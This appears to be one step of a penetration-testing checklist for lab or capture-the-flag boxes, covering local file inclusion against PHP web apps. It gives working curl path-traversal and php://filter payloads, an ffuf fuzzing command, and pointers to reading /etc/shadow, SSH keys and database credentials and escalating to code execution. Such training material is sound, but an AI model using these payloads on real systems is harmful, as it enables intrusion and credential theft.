# Linux - LFI

**Step 7 of 50 · Linux**

*Confirm local file inclusion, read sensitive files, and escalate to code execution if PHP wrappers are available.*

## Run this

Find the parameter — look for `?file=`, `?page=`, `?path=`, `?template=`, `?img=` in the URL or form source. Then test:

```bash
# Basic path traversal — confirms LFI if /etc/passwd returns
curl -s "http://$BoxIP/index.php?file=../../../../etc/passwd"

# PHP filter — read PHP source without executing it
curl -s "http://$BoxIP/index.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# Parameter fuzzing — find the vulnerable parameter if it is not obvious
ffuf -u "http://$BoxIP/image.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 0
```

## Example output

Path traversal confirmed:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

PHP filter output (pipe to `base64 -d`):

```
<?php
$db_password = "REDACTED";
...
```

## What did you get?

- [ ] `/etc/passwd` is returned → **LFI confirmed — try `/etc/shadow`, SSH keys at `/home/username/.ssh/id_rsa`, and web config files**
- [ ] PHP source is returned via `php://filter` → **Read all included config files for database credentials**
- [ ] Credentials or keys are found → **Validate them and go to Step 17 · [[Linux - Credential Search]] or SSH in**
- [ ] LFI works but no useful files are found → **Go to HackTricks LFI for log poisoning and `data://` RCE payloads**
- [ ] A shell is caught from `data://` or log poisoning → **Go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The parameter does not accept traversal → **Try null byte (`%00`) if PHP < 5.3.4, and double URL-encoding**

## Notes

Read every PHP file you can reach — `config.php`, `db.php`, `functions.php`. Config files often contain database credentials that lead to a shell via [[Linux - Database Access]].

For RCE via `data://` or log poisoning, build the payload from HackTricks — the exact wrapper and encoding vary by PHP version and server configuration.

## Gotcha

> [!warning] 💡
> `php://filter` and `data://` wrappers only work when the target runs PHP and the include function is not filtering protocol wrappers. If the wrapper is silently ignored, the parameter is being sanitised.

> [!warning] 💡
> Null-byte truncation (`%00`) only works on PHP versions below 5.3.4. On modern PHP, use other bypass techniques listed on PayloadsAllTheThings.

## External Resources

| Resource | Link |
|---|---|
| HackTricks — LFI | https://book.hacktricks.xyz/pentesting-web/file-inclusion |
| PayloadsAllTheThings — LFI | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion |
